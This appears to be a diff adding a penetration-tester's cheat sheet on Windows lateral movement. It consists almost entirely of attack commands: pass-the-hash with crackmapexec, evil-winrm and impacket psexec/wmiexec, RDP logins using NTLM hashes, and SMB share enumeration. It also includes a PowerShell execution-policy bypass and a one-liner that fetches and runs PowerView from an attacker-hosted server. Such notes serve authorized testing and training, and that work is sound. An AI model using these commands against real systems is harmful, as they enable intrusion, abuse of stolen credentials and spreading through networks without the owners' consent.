@@ -1,0 +1,95 @@
+Windows Lateral Movement
+
+
+# Overview
+
+Move between Windows hosts using harvested credentials, WinRM, RDP, SMB, and remote execution.
+
+
+# Related Notes
+
+active-directory.txt     Domain attack paths and BloodHound
+windows-credentials.txt  Obtaining NTLM hashes for PtH
+windows-privesc.txt      Open RDP via firewall if needed
+passwords.txt            Crack hashes offline
+
+
+# Pass-the-Hash
+
+## Overview
+
+Use NTLM hashes without cracking when SMB or WinRM accepts NTLM authentication.
+
+## Commands
+
+crackmapexec smb <target IP> -u <user> -H <NTLM hash>
+crackmapexec smb <target IP> -u <user> -H <NTLM hash> --shares
+crackmapexec smb <target IP> -u <user> -H <NTLM hash> -x whoami
+
+evil-winrm -i <target IP> -u <user> -H <NTLM hash>
+evil-winrm -i <target IP> -u <user> -p <password>
+
+impacket-psexec <domain>/<user>@<target IP> -hashes :<NTLM hash>
+impacket-wmiexec <domain>/<user>@<target IP> -hashes :<NTLM hash>
+
+## Validation / False Positives
+
+PtH fails on hosts requiring Kerberos only, blocked NTLM, or Protected Users — note the error and try password or Kerberos tickets.
+
+
+# WinRM
+
+## Commands
+
+nmap -Pn -n -T4 --open -p5985,5986 -sV <target IP>
+
+msf > use auxiliary/scanner/winrm/winrm_auth_methods
+
+crackmapexec winrm <target IP> -u <user> -p <password> -x ipconfig
+crackmapexec winrm <target IP> -u <user> -H <NTLM hash> -x ipconfig
+
+evil-winrm -i <target IP> -u <user> -p <password> -s /opt/Nishang/
+evil-winrm -i <target IP> -u <user> -H <NTLM hash>
+
+## Validation / False Positives
+
+Port 5985 open does not guarantee WinRM auth for your user — confirm with crackmapexec or evil-winrm.
+
+
+# RDP
+
+## Commands
+
+From Kali after enabling RDP on target (see windows-privesc.txt):
+    xfreerdp /u:<user> /p:<password> /v:<target IP> /cert:ignore
+    xfreerdp /u:<user> /pth:<NTLM hash> /v:<target IP> /cert:ignore
+
+Check who has RDP rights on target:
+    net localgroup "Remote Desktop Users"
+
+## Validation / False Positives
+
+Successful RDP requires network path, valid creds, and membership in Remote Desktop Users or Administrators.
+
+
+# SMB Shares and PsExec
+
+## Commands
+
+Find readable/writable shares:
+    crackmapexec smb <target range> -u <user> -p <password> --shares
+    smbmap -H <target IP> -u <user> -p <password>
+
+PowerView ShareFinder (on compromised host):
+    cd /opt/PowerSploit/Recon/
+    python3 -m http.server 80
+    powershell -nop -exec bypass
+    iex (iwr -UseBasicParsing http://<attacker IP>/PowerView.ps1); Invoke-ShareFinder -CheckShareAccess
+
+Remote service creation:
+    crackmapexec smb <target IP> -u <user> -p <password> -x whoami
+    impacket-psexec <domain>/<user>@<target IP> -hashes :<NTLM hash>
+
+## Validation / False Positives
+
+Share listing without read/write proof is recon only — upload or download a test file to confirm access.
